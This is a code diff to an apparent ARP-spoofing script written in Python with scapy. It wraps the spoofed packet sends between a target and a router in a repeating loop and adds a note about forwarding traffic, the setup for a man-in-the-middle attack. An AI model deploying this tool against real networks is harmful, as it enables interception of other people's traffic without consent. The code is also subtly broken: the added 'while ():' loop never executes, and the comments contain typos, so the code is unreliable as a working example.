@@ -2,8 +2,9 @@
 
 import scapy.all as scapy
 import argparse
-import subprocess
-import re
+# import subprocess
+# import re
+import time
 
 
 #    def router_ip_finder():
@@ -58,8 +59,13 @@ def main():
     packet_for_target = spoof(target_IP, router_IP)
     packet_for_router = spoof(router_IP, target_IP)
 
-    scapy.send(packet_for_target)
-    scapy.send(packet_for_router)
+    # make funtction that opens neeeded ports for flowing traffic through
+
+    print("[+] Spoofing has begin")
+    while ():
+        scapy.send(packet_for_target)
+        scapy.send(packet_for_router)
+        time.sleep(3)
 
 
 main()
